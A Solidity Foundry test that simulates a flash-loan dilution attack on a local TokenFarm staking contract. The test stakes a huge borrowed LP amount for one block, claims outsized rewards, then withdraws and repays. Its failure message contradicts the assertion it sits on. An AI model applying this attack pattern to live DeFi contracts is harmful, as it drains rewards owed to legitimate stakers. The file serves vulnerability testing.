// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test, console} from "forge-std/Test.sol";
import {TokenFarm} from "../src/TokenFarm.sol";
import {DAppToken} from "../src/DAppToken.sol";
import {LPToken} from "../src/LPToken.sol";

contract FlashLoanTest is Test {
    TokenFarm public tokenFarm;
    DAppToken public dAppToken;
    LPToken public lpToken;

    address public owner = makeAddr("owner");
    address public attacker = makeAddr("attacker");
    address public legitimateUser = makeAddr("legitimateUser");

    uint256 public constant LEGITIMATE_STAKE = 1_000e18;
    uint256 public constant FLASH_LOAN_AMOUNT = 999_000e18;
    uint256 public constant REWARD_TOKENS_IN_FARM = 1_000_000e18;

    function setUp() public {
        // Deploy contracts
        vm.startPrank(owner);
        dAppToken = new DAppToken(owner);
        lpToken = new LPToken(owner);
        tokenFarm = new TokenFarm(dAppToken, lpToken);

        // Fund the TokenFarm with reward tokens
        dAppToken.mint(address(tokenFarm), REWARD_TOKENS_IN_FARM);

        // Fund the legitimate user and have them stake
        lpToken.mint(legitimateUser, LEGITIMATE_STAKE);
        vm.stopPrank();

        vm.startPrank(legitimateUser);
        lpToken.approve(address(tokenFarm), LEGITIMATE_STAKE);
        tokenFarm.deposit(LEGITIMATE_STAKE);
        vm.stopPrank();
    }

    function test_FlashLoanAttack_StealsUnfairRewards() public {
        // --- 1. Simulate the Flash Loan & Deposit ---
        vm.startPrank(owner);
        lpToken.mint(attacker, FLASH_LOAN_AMOUNT);
        vm.stopPrank();

        // Use startPrank for multiple calls from the attacker
        vm.startPrank(attacker);
        lpToken.approve(address(tokenFarm), FLASH_LOAN_AMOUNT);
        tokenFarm.deposit(FLASH_LOAN_AMOUNT);
        vm.stopPrank();

        // --- 2. Time passes: one block ---
        vm.roll(block.number + 1);

        // --- 3. Attacker claims their unfairly large reward ---
        vm.startPrank(attacker);
        tokenFarm.claimRewards();
        vm.stopPrank();
        uint256 attackerReward = dAppToken.balanceOf(attacker);
        console.log("Attacker earned rewards: %s", attackerReward);

        // --- 4. Legitimate user claims their diluted reward while attack is active ---
        vm.prank(legitimateUser);
        tokenFarm.claimRewards();
        uint256 legitimateUserReward = dAppToken.balanceOf(legitimateUser);
        console.log("Legitimate user earned rewards: %s", legitimateUserReward);

        // --- 5. Attacker withdraws and repays loan ---
        vm.startPrank(attacker);
        tokenFarm.withdraw();
        lpToken.transfer(owner, FLASH_LOAN_AMOUNT);
        vm.stopPrank();

        // --- 6. Assertion ---
        // The attacker's reward should be vastly greater than the legitimate user's,
        // proving the dilution attack was successful.
        assertTrue(attackerReward > legitimateUserReward * 900, "Attacker should not be able to drain rewards");
    }
}
